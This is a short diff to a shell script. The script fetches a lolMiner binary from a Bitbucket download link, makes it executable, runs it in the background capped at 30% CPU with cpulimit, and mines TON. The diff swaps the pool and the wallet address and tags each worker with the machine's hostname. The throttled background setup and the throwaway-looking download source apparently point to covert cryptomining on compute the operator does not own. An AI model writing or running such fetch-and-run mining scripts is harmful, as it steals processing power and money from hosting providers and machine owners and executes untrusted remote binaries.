@@ -12,4 +12,4 @@ wget https://bitbucket.org/oqoixgqoq9/tur/downloads/lolMiner
 ph add lolMiner
 chmod +x lolMiner
 cpulimit -e lolMiner -l 30 &
-./lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT.$(cat /proc/sys/kernel/hostname)
+./lolMiner --algo TON --pool https://next.ton-pool.com --user EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF.$(cat /proc/sys/kernel/hostname)
